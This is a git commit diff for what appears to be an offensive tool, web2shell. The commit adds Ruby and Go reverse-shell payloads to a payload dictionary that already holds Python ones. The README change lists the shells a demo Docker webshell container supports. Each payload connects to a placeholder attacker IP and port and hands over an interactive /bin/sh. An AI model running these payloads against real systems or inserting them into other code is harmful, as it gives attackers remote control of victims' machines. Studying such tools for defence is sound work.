7977cff0b6c6e5c857500c304173e767a4fc8229
Evan Edwards <evan@ejedev.com>
2023-05-10 23:07:43 -0700

    Golang and Ruby support

--- data/payloads.py
+++ data/payloads.py
@@ -16,4 +16,10 @@ payloads = {
         'PATHHERE -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPHERE",PORTHERE));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
         'PATHHERE -c \'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPHERE",PORTHERE));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\'',
     ],
+    "ruby": [
+        'PATHHERE -rsocket -e\'exit if fork;c=TCPSocket.new("IPHERE","PORTHERE");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}\''
+    ],
+    "go": [
+        'export GOCACHE=/tmp; echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","IPHERE:PORTHERE");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && PATHHERE run /tmp/t.go && rm /tmp/t.go'
+    ],
 }
--- demo/README.md
+++ demo/README.md
@@ -4,4 +4,10 @@
 2. Run the image (`docker run -it -p 8080:80 webshell`)
 3. Use web2shell to secure a remote connection on the docker0 interface (`python3 web2shell.py  --url http://127.0.0.1:8080/cmd.php?cmd=SHELL --interface docker0`)
 
-Note: This Docker container only has `python`, `perl`, and `php` binaries.
+Note: This Docker container has the binaries for all supported reverse shells. They are as follows:
+
+- Perl
+- PHP
+- Python
+- Ruby
+- Golang
